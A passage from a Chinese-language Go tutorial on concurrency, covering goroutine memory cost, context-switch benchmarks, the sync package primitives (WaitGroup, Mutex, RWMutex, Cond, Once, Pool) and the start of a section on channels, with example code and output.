&#123;\t\t\tdefer wg.Done()\t\t\tfmt.Println(salutations)\t\t&#125;(salutations)\t&#125;\twg.Wait()&#125;\n\n当然，在1.22及以后的版本是不需要这么写的。\n这些goroutine在相同的地址空间中运行，并且只有简单的宿主函数，所有使用goroutine编写非并发代码是非常自然的。Go语言的编译器很好地处理了内存中的变量，这样goroutine就不会意外地访问被释放的内存，这使得开发人员可以专注于他们的问题空间而不是内存管理。然而，这不是一张空白支票。\n由于多个goroutine可以在同一个地址空间上运行，所以我们仍然需要担心同步问题。正如我们已经讨论过的，我们可以选择同步访问goroutine访问的共享内存，或者可以使用CSP原语通过通信来共享内存。\ngoroutine的另一个好处是它们非常轻。下面是“Go语言FAQ”的摘录：\n\n一个新创建的goroutine被赋予了几千字节，这在大部分情况都是足够的。当它不运行时，Go语言运行时就会自动增长（缩小）存储堆栈的内存，允许许多goroutine存在适当的内存中。每个函数调用CPU的开销平均为3个廉价指令。在同一个地址空间中创建成千上万的goroutine是可行的。如果goroutine只是线程，系统的资源消耗会更小。\n\n每个goroutine几千字节，这并没有什么问题！让我们来验证一下。但是在我们开始之前，我们必须讨论一个关于goroutine有趣的事情：GC并没有回收被丢弃的goroutine。如果我写如下代码：\npackage mainfunc main() &#123;\tgo func() &#123;\t\t//将永远阻塞的操作\t&#125;()\t//开始工作&#125;\n\n这里的goroutine将一直存在直到进程退出（协程泄露！）。在下一个例子中，我们将利用这一点来实际测算goroutine的大小。\n在下面的例子中，我们将goroutine不被GC的事实与运行时的自省能力结合起来，并测算在goroutine创建之前和之后分配的内存数量：\npackage mainimport (\t&quot;fmt&quot;\t&quot;runtime&quot;\t&quot;sync&quot;)func main() &#123;\tmemConsumed := func() uint64 &#123;\t\truntime.GC()\t\tvar s runtime.MemStats\t\truntime.ReadMemStats(&amp;s)\t\treturn s.Sys\t&#125;\tvar c &lt;-chan any\tvar wg sync.WaitGroup\tnoop := func() &#123; wg.Done(); &lt;-c &#125;\tconst numGoroutines = 1e6\twg.Add(numGoroutines)\tbefore := memConsumed()\tfor i := numGoroutines; i &gt; 0; i-- &#123;\t\tgo noop()\t&#125;\twg.Wait()\tafter := memConsumed()\tfmt.Printf(&quot;%fkb&quot;, float64(after-before)/numGoroutines/1024)&#125;\n\n我们需要一个永远不会退出的goroutine.,这样就可以在内存中保留一段时间用于测侧算。定义了要创建的goroutine的数量。我们将用大数定律，渐渐地接近一个goroutine的大小。输出结果为：8.560508kb，这里go版本为1.22.4。老版本goroutine的大小会更小。\n理论上百万个goroutine内存占用只有9G。这也足以说明goroutine的轻量。可能会影响性能的是上下文切换，即当一个被托管的并发进程必须保存它的状态以切换到一个不同的运行并发进程时。如果我们有太多的并发进程，可能会将所有的CPU时间消耗在它们之间的上下文切换上，而没有资源完成任何真正需要CPU的工作。在操作系统级别，使用线程可能非常昂贵。OS线程必须保存如寄存器值、查找表和内存映射之类的东西，以便能够在有限的时间内成功地切换回当前线程。然后，它必须为传入的线程加载相同的信息。\n软件中的上下文切换相对来说要廉价得多。在一个软件定义的调度器下，运行时可以更有选择性地保存数据用于检索，如何持久化，以及何时需要持久化。让我们来看看在OS线程和goroutine之间切换的上下文的相对性能。首先，我们将利用Linux的内置基准测试套件来度量在相同核心的两个线程之间发送消息需要多长时间（需要安装perf工具，需要与内核版本匹配：sudo apt install linux-tools-common linux-tools-generic）：taskset -c 0 perf bench sched pipe -T\n输出如下：\n# Running &#x27;sched/pipe&#x27; benchmark:# Executed 1000000 pipe operations between two threads     Total time: 5.855 [sec]       5.855618 usecs/op         170776 ops/sec\n\n这个基准实际上度量了在线程上发送和接收消息所需的时间，因此我们将计算结果并将其除以2。我们用了2.927μs来进行上下文切换。这看起来不算太糟，但还是保留判断，直到我们检查goroutine之间的上下文切换。\n我们将使用Go语言构建一个类似的基准。下面的示例将创建两个goroutine并在它们之间发送一条消息：\npackage mainimport (\t&quot;sync&quot;\t&quot;testing&quot;)func BenchmarkContextSwitch(b *testing.B) &#123;\tvar wg sync.WaitGroup\tbegin := make(chan struct&#123;&#125;)\tc := make(chan struct&#123;&#125;)\tvar token struct&#123;&#125;\tsender := func() &#123;\t\tdefer wg.Done()\t\t&lt;-begin\t\tfor i := 0; i &lt; b.N; i++ &#123;\t\t\tc &lt;- token\t\t&#125;\t&#125;\treceiver := func() &#123;\t\tdefer wg.Done()\t\t&lt;-begin\t\tfor i := 0; i &lt; b.N; i++ &#123;\t\t\t&lt;-c\t\t&#125;\t&#125;\twg.Add(2)\tgo sender()\tgo receiver()\tb.StartTimer()\tclose(begin)\twg.Wait()&#125;\n\n运行结果（go test -bench=. -cpu=1）：\nBenchmarkContextSwitch   6329348        218.8 ns/opPASSok   learn 1.582s\n\n每个上下文切换需要218.8ns，2.927μs的7.48%很难断言goroutine会导致上下文切换过于频繁，但上限可能不会成为使用goroutine的阻碍。\nsync包sync包包含对低级别内存访问同步最有用的并发原语。如果你使用的语言主要通过内存访问同步来处理并发，那么你可能已经熟悉了这些类型。Go语言和这些语言之间的区别在于，Go语言已经在内存访问同步原语之上构建了一组新的并发原语，以向你提供一组扩展的工作。正如我们在第2章“Go语言的并发哲学”中所讨论的，这些操作都有它们的用途，主要是在诸如struct这样的小范围内。由你决定何时进行内存访问同步。说到这里，让我们开始看一下sync包公开的各种原语。\nWaitGroup当你不关心并发操作的结果，或者你有其他方法来收集它们的结果时，WaitGroup是等待一组并发操作完成的好方法。如果这两个条件都不满足，我建议你使用channel和select语句。下面是一个使用WaitGroup等待goroutine完成的基本例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;1st goroutine sleeping...&quot;)\t\ttime.Sleep(1)\t&#125;()\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;2nd goroutine sleeping...&quot;)\t\ttime.Sleep(2)\t&#125;()\twg.Wait()\tfmt.Println(&quot;All goroutines completed.&quot;)&#125;\n\n输出如下：\n2nd goroutine sleeping...1st goroutine sleeping...All goroutines completed.\n\n可以将WaitGroup视为一个并发-安全的计数器：调用通过传入的整数执行add方法增加计数器的增量，并调用Done方法对计数器进行递减。Wait阻塞，直到计数器为零。\n注意，添加的Add调用是在他们帮助跟踪的goroutine之外完成的。如果我们不这样做，我们就会引人一种竞争条件，因为在本章前面“goroutines’”中，我们不能保证goroutine何时会被调度，可以在goroutine开始调度前调用Wait方法。如果将调用Add的方法添加到goroutine的闭包中，那么Wait调用可能会直接返回，而且不会阻塞，因为Add调用不会发生。\n互斥锁与读写锁Mutex 是“互斥”的意思，是保护程序中临界区的一种方式。临界区是你程序中需要独占访问共享资源的区域。Mutex提供了一种安全的方式来表示对这些共享资源的独占访问。为了使用一个资源，channel通过通信共享内存，而Mutex通过开发人员的约定同步访问共享内存。你可以通过使用Mutex对内存进行保护来协调对内存的访问。这里有一个简单的例子，两个goroutine试图增加和减少一个共同的值，它们使用Mutex互斥锁来同步访问：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tvar lock sync.Mutex\tincrement := func() &#123;\t\tlock.Lock()\t\tdefer lock.Unlock()\t\tcount++\t\tfmt.Printf(&quot;Incrementing: %d\\n&quot;, count)\t&#125;\tdecrement := func() &#123;\t\tlock.Lock()\t\tdefer lock.Unlock()\t\tcount--\t\tfmt.Printf(&quot;Decrementing: %d\\n&quot;, count)\t&#125;\t// 增量\tvar arithmetic sync.WaitGroup\tfor i := 0; i &lt;= 5; i++ &#123;\t\tarithmetic.Add(1)\t\tgo func() &#123;\t\t\tdefer arithmetic.Done()\t\t\tincrement()\t\t&#125;()\t&#125;\t// 减量\tfor i := 0; i &lt;= 5; i++ &#123;\t\tarithmetic.Add(1)\t\tgo func() &#123;\t\t\tdefer arithmetic.Done()\t\t\tdecrement()\t\t&#125;()\t&#125;\tarithmetic.Wait()\tfmt.Println(&quot;Arithmetic complete.&quot;)&#125;\n\n输出如下：\nIncrementing: 1Decrementing: 0Decrementing: -1Incrementing: 0Decrementing: -1Decrementing: -2Incrementing: -1Incrementing: 0Arithmetic complete.\n\n你会注意到，我们总是在defer语句中调用Unlock。这是一个十分常见的习惯用法，它使用Mutex互斥锁来确保即使出现了panic,调用也总是发生。如果不这样做，可能会导致程序陷人死锁。关键部分之所以如此命名，是因为它们反映了程序中的瓶颈。进入和退出一个临界区是有消耗的，所以一般人会尽量减少在临界区的时间。这样做的一个策略是减少临界区的范围。可能存在需要在多个并发进程之间共享内存的情况，但可能这些进程不是都需要读写此内存。如果是这样，你可以利用不同类型的互斥对象：sync.RWMutex。\nSync.RWMutex在概念上和互斥是一样的：它守卫着对内存的访问，然而，RWMutex让你对内存有了更多控制。你可以请求一个锁用于读处理，在这种情况下你将被授予访问权限，除非该锁被用于写处理。这意味着，任意数量的读消费者可以持有一个读锁，只要没有共他事物持有一个写锁。这里有一个例子，它演示了一个生产者，它不像代码中创建的众多消费者那样活跃：\npackage mainimport (\t&quot;fmt&quot;\t&quot;math&quot;\t&quot;os&quot;\t&quot;sync&quot;\t&quot;text/tabwriter&quot;\t&quot;time&quot;)func main() &#123;\tproducer := func(wg *sync.WaitGroup, l sync.Locker) &#123; // 第二个参数是 sync.Locker 类型。这个接口有两个方法，Lock和Unlock。go包中有两个实现，sync.Mutex和sync.RWMutex。\t\tdefer wg.Done()\t\tfor i := 5; i &gt; 0; i-- &#123;\t\t\tl.Lock()\t\t\tl.Unlock()\t\t\ttime.Sleep(1) // 让 producer 等待，使其比观察者的 goroutine 更不活跃。\t\t&#125;\t&#125;\tobserver := func(wg *sync.WaitGroup, l sync.Locker) &#123;\t\tdefer wg.Done()\t\tl.Lock()\t\tdefer l.Unlock()\t&#125;\ttest := func(count int, mutex, rwMutex sync.Locker) time.Duration &#123;\t\tvar wg sync.WaitGroup\t\twg.Add(count + 1)\t\tbeginTestTime := time.Now()\t\tgo producer(&amp;wg, mutex)\t\tfor i := count; i &gt; 0; i-- &#123;\t\t\tgo observer(&amp;wg, rwMutex)\t\t&#125;\t\twg.Wait()\t\treturn time.Since(beginTestTime)\t&#125;\ttw := tabwriter.NewWriter(os.Stdout, 0, 1, 2, &#x27; &#x27;, 0)\tdefer tw.Flush()\tvar m sync.RWMutex\tfmt.Fprintf(tw, &quot;Readers\\tRWMutext\\tMutex\\n&quot;)\tfor i := 0; i &lt; 20; i++ &#123;\t\tcount := int(math.Pow(2, float64(i)))\t\tfmt.Fprintf(\t\t\ttw,\t\t\t&quot;%d\\t%v\\t%v\\n&quot;,\t\t\tcount,\t\t\ttest(count, &amp;m, m.RLocker()),\t\t\ttest(count, &amp;m, &amp;m),\t\t)\t&#125;&#125;\n\n输出如下：\nReaders  RWMutext    Mutex1        76.0748ms   78.666ms2        77.9551ms   77.8809ms4        78.9414ms   77.7889ms8        61.973ms    78.1634ms16       77.1572ms   61.3356ms32       62.9075ms   77.792ms64       61.6918ms   76.5042ms128      61.6087ms   77.0605ms256      62.1438ms   77.894ms512      62.8352ms   46.7669ms1024     46.7329ms   47.4825ms2048     46.5684ms   31.1086ms4096     47.5138ms   62.2136ms8192     7.0075ms    38.8685ms16384    12.4982ms   4.732ms32768    6.505ms     8.7366ms65536    14.3337ms   16.2156ms131072   32.3444ms   35.852ms262144   58.6523ms   71.3403ms524288   117.7048ms  147.1611ms\n\ncond对于cond类型的注释确实很好地描述了它的用途：\n\n…一个goroutine的集合点，等待或发布一个event。\n\n在这个定义中，一个“event”是两个或两个以上的goroutine之间的任意信号，除了它已经发生的事实外，没有任何信息。通常情况下，在goroutine继续执行之前，你需要等待其中一个信号。如果我们要研究如何在没有Cond类型的情况下实现这一目标，一个简单的方法就是使用无限循环：for conditionTrue() == false {}然而，这将消耗一个CPU核心的所有周期。为了解决这个问题，我们可以引入一个time.Sleep：for conditionTrue() == false { time.Sleep(1*time.Millisecond) }这样更好，但它仍然是低效的，而且你必须弄清楚要等待多久：太长，会人为地降低性能：太短，会不必要地消耗太多的CPU时间。如果有一种方法可以让goroutine有效地等待，直到它发出信号并检查它的状态，那就更好了。这正是Cond类型为我们所做的。使用Cond,我们可以这样编写前面例子的代码：\npackage mainimport &quot;sync&quot;func main() &#123;\tc := sync.NewCond(&amp;sync.Mutex&#123;&#125;) // 实例化一个cond。NewCond函数创建一个类型，满足sync.Locker接口。这使得cond类型能够以一种并发安全的方式与其他goroutine协调\tc.L.Lock()                       // 锁定这个条件。这是必要的，因为在进入Locker的时候，执行wait会自动执行unlock。\tfor conditionTrue() == false &#123;\t\tc.Wait() // 等待通知，条件已经发生。这是一个阻塞通信，goroutine将被暂停。\t&#125;\tc.L.Unlock() // 为这个条件Locker执行解锁操作。这是必要的，因为当执行Wait退出操作的时候，它会在Locker上调用Lock方法。&#125;\n\n这种方法效率更高。注意，调用Wait不只是阻塞，它挂起了当前的goroutine,允许其他goroutine在OS线程上运行。当你调用Wait时，会发生一些其他事情：进入Wait后，在Cond变量的Locker上调用Unlock方法，在退出Wait时，在Cond变量的Locker上执行Lock方法。它实际上是方法的一个隐藏的副作用。看起来我们在等待条件发生的时候一直持有这个锁，但事实并非如此。当你浏览代码时，你需要留意这个模式。\n让我们扩展这个例子，并显示等式的两边：等待信号的goroutine和发送信号的goroutine。假设我们有一个固定长度为2的队列，还有10个我们想要推送到队列中的项目。我们想要在有房间的情况下尽快排队，所以就希望在队列中有空间时能立即得到通知。让我们尝试使用Cond来管理这种调度：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tc := sync.NewCond(&amp;sync.Mutex&#123;&#125;)\tqueue := make([]any, 0, 10)\tremoveFromQueue := func(delay time.Duration) &#123;\t\ttime.Sleep(delay)\t\tc.L.Lock()\t\tqueue = queue[1:]\t\tfmt.Println(&quot;Removed from queue&quot;)\t\tc.L.Unlock()\t\tc.Signal()\t&#125;\tfor i := 0; i &lt; 10; i++ &#123;\t\tc.L.Lock()\t\tfor len(queue) == 2 &#123;\t\t\tc.Wait()\t\t&#125;\t\tfmt.Println(&quot;Adding to queue&quot;)\t\tqueue = append(queue, struct&#123;&#125;&#123;&#125;)\t\tgo removeFromQueue(1 * time.Second)\t\tc.L.Unlock()\t&#125;&#125;\n\n输出如下：\nAdding to queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueRemoved from queueAdding to queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queue\n\n该程序成功地将所有10个项目添加到队列中（并且在它有机会将前两项删除之前退出)。它也总是等待，直到至少有一个项目被排入队列，然后再进行另一个项目。在这个例子中，我们还有一个新方法，Signal。这是Cond类型提供的两种方法中的一种，它提供通知goroutine阻塞的调用Wait,条件已经被触发。另一种方法叫做Broadcast。运行时内部维护一个FIFO列表，等待接收信号；Signal发现等待最长时间的goroutine并通知它，而Broadcast向所有等待的goroutine发送信号。Broadcast可以说是这两种方法中比较有趣的一种，因为它提供了一种同时与多个goroutine通信的方法。我们可以通过channel对信号进行简单的复制，但是重复调用Broadcast的行为将会更加困难。此外，与利用channel相比，Cond类型的性能要高很多。\n为了了解使用Broadcast的方法，让我们假设正在创建一个带有按钮的GUI应用程序。我们想注册任意数量的函数，当该按钮被单击时，它将运行。Cond可以完美胜任，因为我们可以使用它的Broadcast方法通知所有注册的处理程序。让我们看看它的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\t// 定义 Button 类型，包含 Clicked 条件\ttype Button struct &#123;\t\tClicked *sync.Cond\t&#125;\tbutton := Button&#123;Clicked: sync.NewCond(&amp;sync.Mutex&#123;&#125;)&#125;\t// 定义订阅函数，提供注册函数以处理来自条件的信号的功能\tsubscribe := func(c *sync.Cond, fn func()) &#123;\t\tvar goroutineRunning sync.WaitGroup\t\tgoroutineRunning.Add(1)\t\tgo func() &#123;\t\t\tgoroutineRunning.Done()\t\t\tc.L.Lock()\t\t\tdefer c.L.Unlock()\t\t\tc.Wait()\t\t\tfn()\t\t&#125;()\t\tgoroutineRunning.Wait()\t&#125;\tvar clickRegistered sync.WaitGroup\tclickRegistered.Add(3)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Maximizing window.&quot;)\t\tclickRegistered.Done()\t&#125;)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Displaying annoying dialog box!&quot;)\t\tclickRegistered.Done()\t&#125;)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Mouse clicked.&quot;)\t\tclickRegistered.Done()\t&#125;)\tbutton.Clicked.Broadcast()\tclickRegistered.Wait()&#125;\n\n输出如下：\nMouse clicked.Maximizing window.Displaying annoying dialog box!\n\n可以看到，在 Click Cond 上调用 Broadcast ，所有三个处理程序都将运行。如果不是 clickRegistered 的 WaitGroup,我们可以调用button.Clicked.Broadcast()多次，并且.每次都调用三个处理程序。这是channel不太容易做到的，因此是利用Cond类型的主要原因之一。\n与sync包中所包含的大多数其他东西一样，Cond的使用最好被限制在一个紧凑的范围中，或者是通过封装它的类型来暴露在更大范围内。\nonceonce 比较简单，顾名思义：只会被执行一次。\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tincrement := func() &#123;\t\tcount++\t&#125;\tvar once sync.Once\tvar increments sync.WaitGroup\tincrements.Add(100)\tfor i := 0; i &lt; 100; i++ &#123;\t\tgo func() &#123;\t\t\tdefer increments.Done()\t\t\tonce.Do(increment)\t\t&#125;()\t&#125;\tincrements.Wait()\tfmt.Printf(&quot;Count is %d\\n&quot;, count)&#125;\n\n输出为：Count is 1\nsync.Once是一种类型，它在内部使用一些sync原语，以确保即使在不同的goroutine上，也只会调用一次Do方法处理传递进来的函数。这确实是因为我们将调用sync.Once方式执行Do方法。\n使用sync.Once有几件事需要注意。让我们看另一个例子，你认为它会打印什么？\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tincrement := func() &#123; count++ &#125;\tdecrement := func() &#123; count-- &#125;\tvar once sync.Once\tonce.Do(increment)\tonce.Do(decrement)\tfmt.Printf(&quot;Count: %d\\n&quot;, count)&#125;\n\n输出如下：Count: 1\nsync.Once只计算调用Do方法的次数，而不是多少次唯一调用Do方法。这样，sync.Once的副本与所要调用的函数紧密耦合，我们再次看到如何在一个严格的范围内合理使用sync包中的类型以发挥最佳效果。我建议你通过将sync.Once包装在一个小的语法块中来形式化这种耦合：要么是一个小函数，要么是将两者包装在一个结构体中。这个例子你认为会发生什么？\npackage mainimport (\t&quot;sync&quot;)func main() &#123;\tvar onceA, onceB sync.Once\tvar initB func()\tinitA := func() &#123; onceB.Do(initB) &#125;\tinitB = func() &#123; onceA.Do(initA) &#125; // 1\tonceA.Do(initA)                    // 2&#125;\n\n1这个调用在2返回之前不能进行。这个程序将会死锁，因为在1调用的Do直到2调用Do并退出后才会继续，这是死锁的典型例子。对一些人来说，这可能有点违反直觉，因为它看起来好像我们使用的sync.Once是为了防止多重初始化，但sync.Once唯一能保证的是你的函数只被调用一次。有时，这是通过死锁程序和暴露逻辑中的缺陷来完成的，在这个例子中是一个循环引用。\n池池(Pool)是Pool模式的并发安全实现。在较高的层次上，Pool模式是一种创建和提供可供使用的固定数量实例或 Pool实例的方法。它通常用于约束创建昂贵的场景（如数据库连接），以便只创建固定数量的实例，但不确定数量的操作仍然可以请求访问这些场景。对于Go语言的sync.Pool,这种数据类型可以被多个goroutine安全地使用。\nPool的主接口是它的Get方法。当调用时，Get将首先检查池中是否有可用的实例返回给调用者，如果没有，调用它的new方法来创建一个新实例。当完成时，调用者调用Put方法把工作的实例归还到池中，以供其他进程使用。这里有一个简单的例子来说明：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tmyPool := &amp;sync.Pool&#123;\t\tNew: func() any &#123;\t\t\tfmt.Println(&quot;Creating new instance.&quot;)\t\t\treturn struct&#123;&#125;&#123;&#125;\t\t&#125;&#125;\tmyPool.Get()             // 调用 Pool 的 get 方法，会执行 Pool 中定义的 New 函数，因为实例还没有实例化。 \tinstance := myPool.Get() // 同上\tmyPool.Put(instance)     // 将之前的实例放回池中，增加了池内可用数量。\tmyPool.Get()             // 再调用时，会重用之前的示例，不会调用 New 函数。&#125;\n\n我们只看到两个对New函数的调用：\nCreating new instance.Creating new instance.\n\n那么，为什么要使用 Pool,而不只是在运行时实例化对象呢？Go语言是有 GC 的，因此实例化的对象将被自动清理。有什么意义？考虑下面这个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar numCalcsCreated int\tcalcPool := &amp;sync.Pool&#123;\t\tNew: func() any &#123;\t\t\tnumCalcsCreated += 1\t\t\tmem := make([]byte, 1024)\t\t\treturn &amp;mem // 存储bytes切片的地址\t\t&#125;,\t&#125;\t// 用4KB初始化 pool\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tconst numWorkers = 1024 * 1024\tvar wg sync.WaitGroup\twg.Add(numWorkers)\tfor i := numWorkers; i &gt; 0; i-- &#123;\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\tmem := calcPool.Get().(*[]byte)\t\t\tdefer calcPool.Put(mem)\t\t\t// 做一些有趣的假设，但是很快就会用这个内存完成\t\t&#125;()\t&#125;\twg.Wait()\tfmt.Printf(&quot;%d calculators were created.&quot;, numCalcsCreated)&#125;\n\n输出如下：23 calculators were created.如果我没有用sync.Pool运行这个例子，尽管结果是不确定的，在最坏的情况下，我可能尝试分配一个十亿字节的内存，但是正如你从输出看到的，我只分配了4KB。另一种常见的情况是，用Pool来尽可能快地将预先分配的对象缓存加载启动。在这种情况下，我们不是试图通过限制创建的对象的数量来节省主机的内存，而是通过提前加载获取引用到另一个对象所需的时间，来节省消费者的时间。这在编写高吞吐量网络服务器时十分常见，服务器试图快速响应请求。让我们来看看这样的场景。首先，让我们创建一个模拟创建到服务的连接的函数。我们会让这次连接花很长时间：\npackage mainimport &quot;time&quot;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n接下来，让我们了解一下，如果服务为每个请求都启动一个新的连接，那么网络服务的性能如何。我们将编写一个网络处理程序，为每个请求都打开一个新的连接。为了使基准测试简单，我们只允许一次连接：\npackage mainimport (\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;net&quot;\t&quot;sync&quot;\t&quot;time&quot;)func startNetworkDaemon() *sync.WaitGroup &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tserver, err := net.Listen(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tlog.Fatalf(&quot;cannot listen:%v&quot;, err)\t\t&#125;\t\tdefer server.Close()\t\twg.Done()\t\tfor &#123;\t\t\tconn, err := server.Accept()\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot accept connection:%v&quot;, err)\t\t\t\tcontinue\t\t\t&#125;\t\t\tconnectToService()\t\t\tfmt.Fprintln(conn, &quot;&quot;)\t\t\tconn.Close()\t\t&#125;\t&#125;()\treturn &amp;wg&#125;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n现在我们的基准如下：\npackage mainimport (\t&quot;io/ioutil&quot;\t&quot;net&quot;\t&quot;testing&quot;)func init() &#123;\tdaemonStarted := startNetworkDaemon()\tdaemonStarted.Wait()&#125;func BenchmarkNetworkRequest(b *testing.B) &#123;\tfor i := 0; i &lt; b.N; i++ &#123;\t\tconn, err := net.Dial(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tb.Fatalf(&quot;cannot dial host:%v&quot;, err)\t\t&#125;\t\tif _, err := ioutil.ReadAll(conn); err != nil &#123;\t\t\tb.Fatalf(&quot;cannot read:%v&quot;, err)\t\t&#125;\t\tconn.Close()\t&#125;&#125;\n\n输出如下：\nBenchmarkNetworkRequestBenchmarkNetworkRequest-20    \t      10\t1010578820 ns/opPASS\n\n看看 sync.Pool 改进的：\npackage mainimport (\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;net&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;&#125;func warmServiceConnCache() *sync.Pool &#123;\tp := &amp;sync.Pool&#123;\t\tNew: connectToService,\t&#125;\tfor i := 0; i &lt; 10; i++ &#123;\t\tp.Put(p.New())\t&#125;\treturn p&#125;func startNetworkDaemon() *sync.WaitGroup &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tconnPool := warmServiceConnCache()\t\tserver, err := net.Listen(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tlog.Fatalf(&quot;cannot listen:%v&quot;, err)\t\t&#125;\t\tdefer server.Close()\t\twg.Done()\t\tfor &#123;\t\t\tconn, err := server.Accept()\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot accept connection:%v&quot;, err)\t\t\t\tcontinue\t\t\t&#125;\t\t\tsvcConn := connPool.Get()\t\t\tfmt.Fprintln(conn, &quot;&quot;)\t\t\tconnPool.Put(svcConn)\t\t\tconn.Close()\t\t&#125;\t&#125;()\treturn &amp;wg&#125;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n输出如下：\nBenchmarkNetworkRequestBenchmarkNetworkRequest-20    \t    3800\t   4567334 ns/opPASS\n\n快了三个数量级，在处理代价昂贵的事务时使用这种模式可以极大的提高响应时间。\n当你的并发进程需要请求一个对象，但是在实例化之后很快地处理它们时，或者在这些对象的构造可能会对内存产生负面影响，这时最好使用Pool设计模式。然而，有些情况下要谨慎决定你是否应该使用Pool:如果你使用Pool代码所需要的东西不是大概同质的，那么从Pool中转化检索到所需要的内容的时间可能比重新实例化内容要花费的时间更多。例如，如果你的程序需要随机和可变长度的切片，那么Pool将不会对你有多大帮助。你直接从Pool中获得一个正确的切片的概率是很低的。\n所以当你使用Pool工作时，记住以下几点：\n\n当实例化sync.Pool,使用new方法创建一个成员变量，在调用时是线程安全的。\n当你收到一个来自 Get 的实例时，不要对所接收的对象的状态做出任何假设。\n当你用完了一个从Pool中取出来的对象时，一定要调用Put,否则，Pool就无法复用这个实例了。通常情况下，这是用defer完成的。\nPool内的分布必须大致均匀。\n\nChannelchannel是由Hoare的CSP派生的同步原语之一。虽然它们可以用来同步内存访问，但它们最好用于在goroutine之间传递信息。正如我们在第2章“Go语言的并发哲学”中所讨论的，在任何大小的程序中，channel都非常有用，因为它们可以组合在一起。\n就像河流一样，一个channel充当着信息传送的管道，值可以沿着channel传递，然后在下游读出。当你使用channel时，你会将一个值传递给一个chan变量，然后你程序中的某个地方将它从channel中读出。程序中不同的部分不需要相互了解，只需要在channel所在的内存中引用相同的位置即可。这可以通过对程序上下游的channel引用来完成。\n创建一个channel非常简单。使用内置的make函数：dataChan := make(chan any) 这是一个双向的channel。channel也可以声明为只支持单向的数据流，也就是说，可以定义一个channel只支持发送或接收信息：dataChan := make(chan&lt;- any) or dataChan := make(&lt;-chan any)通过 &lt;- 的方向来区分，还是非常直观的。\n但我们通常不会看到单向channel实例化，但是会经常看到它们用作函数参数和返回类型。当需要时，Go语言会隐式地将双向channel转换为单向channel。这里有一个例子：\nvar receiveChan &lt;-chan anyvar sendChan chan&lt;- anydataStream := make(chan any)// 有效的语法：receiveChan = datastreamsendChan = dataStream\n\n使用 channel 也是通过 &lt;- 操作符来完成。将数据放到channel中：dataChan &lt;- data从channel中读取数据：data := &lt;-dataChan\n尝试向只读的channel写数据会报错：invalid operation: cannot send to receive-only channel readOnlyCh (variable of type &lt;-chan int)尝试从只写的channel读数据会报错：invalid operation: cannot receive from send-only channel writeOnlyCh (variable of type chan&lt;- int)这是Go语言的类型系统的一部分，它允许我们在处理并发原语时使用type-safety。\nGo语言中的channel是阻塞的。这意味着只有 channel 内的数据被消费后，新的数据才能写入，而任何试图从空channel 读取数据的goroutine将等待至少一条数据被写入channel后才能读到。\n如果不正确地构造程序，这会导致死锁：\npackage mainimport (\t&quot;fmt&quot;)func main() &#123;\tstringStream := make(chan string)\tgo func() &#123;\t\tif 0 != 1 &#123;\t\t\treturn\t\t&#125;\t\tstringStream &lt;- &quot;Hello channels!&quot;\t&#125;()\tfmt.Println(&lt;-stringStream)&#125;\n\n通过 &lt;- 操作符的接受形式也可以选择返回两个值：data, ok := &lt;-dataChanok 是一个布尔值。当channel关闭时，ok为false，data为零值。当channel开启时，ok为true，data为channel中存储的值。如果没有数据，则会阻塞。使用 close(dataChan) 关闭一个channel。\n这为我们提供了一些新的模式。第一个是从channel中获取。通过range关键作为参数遍历（与for语句一起使用），并且在channel关闭时自动中断循环。这允许对channel上的值进行简洁的迭代。让我们看一个例子：\npackage mainimport &quot;fmt&quot;func main() &#123;\tintstream := make(chan int)\tgo func() &#123;\t\t// 我们确保在goroutine退出之前channel是关闭的。这是一个很常见的模式。\t\tdefer close(intstream)\t\tfor i := 1; i &lt;= 5; i++ &#123;\t\t\tintstream &lt;- i\t\t&#125;\t&#125;()\t// 遍历了 intstream\tfor integer := range intstream &#123;\t\tfmt.Printf(&quot;%v &quot;, integer)\t&#125;&#125;\n\n运行结果：1 2 3 4 5 \n注意该循环不需要退出条件，并且 range 方法不返回第二个布尔值。处理一个已关闭的 channel 的细节可以让你保持循环简洁。\n关闭 channel 也是一种同时给多个 goroutine 发信号的方法。 如果有 n 个 goroutine 在一个 